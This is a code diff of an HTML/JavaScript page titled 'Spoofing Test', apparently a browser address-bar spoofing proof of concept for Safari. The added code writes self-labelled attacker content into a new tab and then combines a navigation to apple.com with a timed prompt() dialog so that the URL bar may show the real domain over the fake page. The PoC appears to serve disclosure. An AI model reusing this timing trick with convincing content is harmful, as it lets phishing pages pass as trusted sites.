@@ -9,7 +9,7 @@
     content="width=device-width, initial-scale=1, user-scalable=yes"
   />
 
-  <title>Browser Test</title>
+  <title>Spoofing Test</title>
 
   <style>
     html,
@@ -21,13 +21,23 @@
       font-family: Arial, sans-serif;
     }
 
-    button {
+    .container {
       position: fixed;
+
       top: 50%;
       left: 50%;
+
       transform: translate(-50%, -50%);
 
+      width: 90%;
+      max-width: 850px;
+
+      text-align: center;
+    }
+
+    #startBtn {
       padding: 15px 30px;
+
       font-size: 18px;
       font-weight: bold;
 
@@ -39,32 +49,79 @@
 
       cursor: pointer;
     }
+
+    #attempt {
+      font-size: 22px;
+      font-weight: bold;
+
+      margin-bottom: 25px;
+    }
+
+    #instruction {
+      font-size: 22px;
+      line-height: 1.6;
+
+      margin-bottom: 30px;
+    }
+
+    #status {
+      margin-top: 25px;
+
+      font-size: 17px;
+      color: #666;
+    }
+
+    .warning {
+      margin-top: 25px;
+
+      font-size: 15px;
+      color: #888;
+    }
   </style>
 </head>
 
+
 <body>
 
-<button id="startBtn">
-  CLICK HERE
-</button>
+  <div class="container">
+
+    <div id="attempt">
+      Attempt 1 of 4
+    </div>
+
+    <div id="instruction">
+      Click the button below to start the browser test.
+    </div>
+
+    <button id="startBtn">
+      CLICK HERE
+    </button>
+
+    <div id="status"></div>
+
+    <div class="warning">
+      Browser UI testing — controlled test environment
+    </div>
+
+  </div>
 
 
 <script>
 
-const COUNTER_KEY = "browser_test_attempt";
-
-const startBtn =
-  document.getElementById("startBtn");
+const STORAGE_KEY =
+  "spoof_test_attempt";
 
 
 /*
- * Get current attempt
+ * ==========================================
+ * GET CURRENT ATTEMPT
+ * ==========================================
  */
 
 function getAttempt() {
 
   return parseInt(
-    localStorage.getItem(COUNTER_KEY) || "0",
+    localStorage.getItem(STORAGE_KEY) || "0",
     10
   );
 
@@ -72,31 +129,37 @@ function getAttempt() {
 
 
 /*
- * Save attempt
+ * ==========================================
+ * SAVE ATTEMPT
+ * ==========================================
  */
 
 function saveAttempt(attempt) {
 
   localStorage.setItem(
-    COUNTER_KEY,
-    attempt
+    STORAGE_KEY,
+    String(attempt)
   );
 
 }
 
 
 /*
- * Reset test
+ * ==========================================
+ * RESET TEST
  *
- * Run this from DevTools Console:
+ * Run:
  *
  * resetTest()
+ *
+ * in Safari Web Inspector console.
+ * ==========================================
  */
 
 function resetTest() {
 
   localStorage.removeItem(
-    COUNTER_KEY
+    STORAGE_KEY
   );
 
   location.reload();
@@ -105,389 +168,36 @@ function resetTest() {
 
 
 /*
- * Create temporary page
+ * ==========================================
+ * UPDATE PAGE UI
+ * ==========================================
  */
 
-function createPage(tab, attempt) {
+function updateUI(attempt) {
 
-  tab.document.write(`
+  const attemptText =
+    document.getElementById("attempt");
 
-<!doctype html>
+  const instruction =
+    document.getElementById("instruction");
 
-<html>
-
-<head>
-
-<meta charset="utf-8">
-
-<title>Browser Test</title>
-
-<style>
-
-html,
-body {
-
-  margin: 0;
-  padding: 0;
-
-  width: 100%;
-  height: 100%;
-
-  background: #fff;
-
-  font-family: Arial, sans-serif;
-
-}
-
-body {
-
-  display: flex;
-
-  align-items: center;
-
-  justify-content: center;
-
-  text-align: center;
-
-}
-
-.container {
-
-  width: 90%;
-  max-width: 900px;
-
-}
-
-.attempt {
-
-  font-size: 30px;
-
-  font-weight: bold;
-
-  margin-bottom: 30px;
-
-}
-
-.status {
-
-  font-size: 72px;
-
-  font-weight: bold;
-
-  margin: 30px 0;
-
-}
-
-.message {
-
-  font-size: 28px;
-
-  color: #555;
-
-}
-
-</style>
-
-</head>
-
-
-<body>
-
-<div class="container">
-
-  <div class="attempt">
-
-    ATTEMPT ${attempt} / 4
-
-  </div>
-
-
-  <div
-    id="status"
-    class="status"
-  >
-
-    PROCESSING...
-
-  </div>
-
-
-  <div
-    id="message"
-    class="message"
-  >
-
-    Browser test is running...
-
-  </div>
-
-</div>
-
-
-<script>
-
-const status =
-  document.getElementById("status");
-
-const message =
-  document.getElementById("message");
-
-
-/*
- * ============================
- * ATTEMPT 1
- * ============================
- */
-
-if (${attempt} === 1) {
-
-  status.textContent =
-    "STEP 1";
-
-  message.textContent =
-    "Starting navigation test...";
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "STEP 2";
-
-    message.textContent =
-      "Temporary state created...";
-
-  }, 700);
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "FAILED";
-
-    message.textContent =
-      "Attempt 1 failed.";
-
-  }, 1500);
-
-
-  setTimeout(() => {
-
-    location.href =
-      "https://k4tedu.github.io/test/1.html";
-
-  }, 2500);
-
-}
-
-
-/*
- * ============================
- * ATTEMPT 2
- * ============================
- */
-
-else if (${attempt} === 2) {
-
-  status.textContent =
-    "STEP 1";
-
-  message.textContent =
-    "Starting second attempt...";
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "STEP 2";
-
-    message.textContent =
-      "Changing navigation state...";
-
-  }, 700);
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "STEP 3";
-
-    message.textContent =
-      "Trying again...";
-
-  }, 1400);
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "FAILED";
-
-    message.textContent =
-      "Attempt 2 failed.";
-
-  }, 2100);
-
-
-  setTimeout(() => {
-
-    location.href =
-      "https://k4tedu.github.io/test/1.html";
-
-  }, 3000);
-
-}
-
-
-/*
- * ============================
- * ATTEMPT 3
- * ============================
- */
-
-else if (${attempt} === 3) {
-
-  status.textContent =
-    "STEP 1";
-
-  message.textContent =
-    "Starting third attempt...";
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "STEP 2";
-
-    message.textContent =
-      "Testing navigation timing...";
-
-  }, 600);
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "STEP 3";
-
-    message.textContent =
-      "Almost completed...";
-
-  }, 1200);
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "STEP 4";
-
-    message.textContent =
-      "Final test before success...";
-
-  }, 1800);
-
-
-  setTimeout(() => {
-
-    status.textContent =
-      "FAILED";
-
-    message.textContent =
-      "Attempt 3 failed.";
-
-  }, 2400);
-
-
-  setTimeout(() => {
-
-    location.href =
-      "https://k4tedu.github.io/test/1.html";
-
-  }, 3300);
-
-}
-
-
-/*
- * ============================
- * ATTEMPT 4
- * ============================
- */
-
-else if (${attempt} >= 4) {
-
-  status.textContent =
-    "SUCCESS";
-
-  message.textContent =
-    "Fourth attempt completed successfully.";
+  const status =
+    document.getElementById("status");
 
 
   /*
-   * Stay here.
-   *
-   * There is intentionally
-   * NO redirect back to 1.html.
+   * Initial state
    */
 
-}
+  if (attempt === 0) {
 
-<\/script>
+    attemptText.textContent =
+      "Ready — Attempt 1 of 4";
 
-</body>
+    instruction.innerHTML =
+      "Click the button below to start the browser test.";
 
-</html>
-
-  `);
-
-  tab.document.close();
-
-}
-
-
-/*
- * ============================
- * MAIN CLICK HANDLER
- * ============================
- */
-
-startBtn.onclick = function () {
-
-  this.remove();
-
-
-  /*
-   * Increase counter
-   */
-
-  let attempt =
-    getAttempt() + 1;
-
-
-  saveAttempt(attempt);
-
-
-  console.log(
-    "[Browser Test] Attempt:",
-    attempt
-  );
-
-
-  /*
-   * Open new tab
-   */
-
-  const newTab =
-    window.open(
-      "about:blank",
-      "_blank"
-    );
-
-
-  if (!newTab) {
-
-    alert(
-      "Popup was blocked."
-    );
+    status.textContent = "";
 
     return;
 
@@ -495,20 +205,324 @@ startBtn.onclick = function () {
 
 
   /*
-   * Run attempt
+   * After attempt 1
    */
 
-  createPage(
-    newTab,
-    attempt
-  );
+  if (attempt === 1) {
 
-};
+    attemptText.textContent =
+      "Attempt 1 completed";
+
+    instruction.innerHTML =
+      `
+      If the browser returned to this page:<br><br>
+
+      <b>1.</b> Press the <b>Back</b> button.<br>
+      <b>2.</b> Refresh this page.<br>
+      <b>3.</b> Click <b>CLICK HERE</b> again.
+      `;
+
+    status.textContent =
+      "Next: Attempt 2";
+
+    return;
+
+  }
+
+
+  /*
+   * After attempt 2
+   */
+
+  if (attempt === 2) {
+
+    attemptText.textContent =
+      "Attempt 2 completed";
+
+    instruction.innerHTML =
+      `
+      Repeat the same procedure:<br><br>
+
+      <b>1.</b> Press the <b>Back</b> button.<br>
+      <b>2.</b> Refresh this page.<br>
+      <b>3.</b> Click <b>CLICK HERE</b> again.
+      `;
+
+    status.textContent =
+      "Next: Attempt 3";
+
+    return;
+
+  }
+
+
+  /*
+   * After attempt 3
+   */
+
+  if (attempt === 3) {
+
+    attemptText.textContent =
+      "Attempt 3 completed";
+
+    instruction.innerHTML =
+      `
+      One more repetition is required.<br><br>
+
+      <b>1.</b> Press the <b>Back</b> button.<br>
+      <b>2.</b> Refresh this page.<br>
+      <b>3.</b> Click <b>CLICK HERE</b> again.<br><br>
+
+      <b>This will be Attempt 4.</b>
+      `;
+
+    status.textContent =
+      "Final attempt ready";
+
+    return;
+
+  }
+
+
+  /*
+   * After attempt 4
+   */
+
+  if (attempt >= 4) {
+
+    attemptText.textContent =
+      "Test completed";
+
+    instruction.innerHTML =
+      `
+      The final browser test has been triggered.
+      `;
+
+    status.textContent =
+      "Attempt 4 executed.";
+
+  }
+
+}
 
 
 /*
- * Make resetTest()
- * available in DevTools.
+ * ==========================================
+ * INITIALIZE PAGE
+ * ==========================================
+ */
+
+let currentAttempt =
+  getAttempt();
+
+updateUI(currentAttempt);
+
+
+/*
+ * ==========================================
+ * MAIN BUTTON
+ * ==========================================
+ */
+
+document
+  .getElementById("startBtn")
+  .onclick = function () {
+
+
+    /*
+     * Increase counter
+     */
+
+    let attempt =
+      getAttempt() + 1;
+
+
+    /*
+     * Limit to attempt 4
+     */
+
+    if (attempt > 4) {
+
+      attempt = 4;
+
+    }
+
+
+    /*
+     * Save counter
+     */
+
+    saveAttempt(attempt);
+
+
+    /*
+     * Remove button temporarily
+     */
+
+    this.remove();
+
+
+    /*
+     * ======================================
+     * OPEN NEW TAB
+     * ======================================
+     */
+
+    const newTab =
+      window.open(
+        "about:blank",
+        "_blank"
+      );
+
+
+    if (!newTab) {
+
+      alert(
+        "Popup was blocked by Safari."
+      );
+
+      return;
+
+    }
+
+
+    /*
+     * ======================================
+     * ATTACKER-CONTROLLED CONTENT
+     * ======================================
+     *
+     * This is intentionally the same
+     * document.write() structure as
+     * your original PoC.
+     */
+
+    newTab.document.write(`
+
+      <!DOCTYPE html>
+
+      <html>
+
+      <head>
+
+        <title>
+          testertester
+        </title>
+
+      </head>
+
+
+      <body
+        style="
+          margin:0;
+          padding:0;
+          background:#fff;
+
+          display:flex;
+
+          align-items:center;
+          justify-content:center;
+
+          min-height:100vh;
+
+          text-align:center;
+        "
+      >
+
+        <div>
+
+          <h1
+            style="
+              font-size:96px;
+              font-weight:bold;
+              color:red;
+
+              margin:0 0 30px 0;
+            "
+          >
+            THIS IS NOT APPLE.COM!
+          </h1>
+
+
+          <i>
+
+            <p
+              style="
+                font-size:64px;
+                font-weight:bold;
+                color:#007aff;
+
+                margin:20px 0;
+              "
+            >
+              *THIS IS ATTACKER CONTROLLED PAGE*
+            </p>
+
+          </i>
+
+
+          <p
+            style="
+              font-size:24px;
+              color:#555;
+            "
+          >
+            Browser UI Test — Attempt ${attempt}
+          </p>
+
+        </div>
+
+      </body>
+
+      </html>
+
+    `);
+
+
+    newTab.document.close();
+
+
+    /*
+     * ======================================
+     * NAVIGATION
+     * ======================================
+     *
+     * The same navigation mechanism from
+     * the original PoC.
+     */
+
+    setTimeout(() => {
+
+      newTab.location.href =
+        "https://apple.com";
+
+    }, 1);
+
+
+    /*
+     * ======================================
+     * DIALOG
+     * ======================================
+     *
+     * Preserve the timing from your
+     * original PoC.
+     */
+
+    setTimeout(() => {
+
+      prompt(
+        "ROOT CAUSE",
+        "Browser UI Test — Attempt " + attempt
+      );
+
+    }, 300);
+
+  };
+
+
+/*
+ * ==========================================
+ * EXPOSE RESET FUNCTION
+ * ==========================================
  */
 
 window.resetTest =
@@ -517,5 +531,4 @@ window.resetTest =
 </script>
 
 </body>
-
 </html>
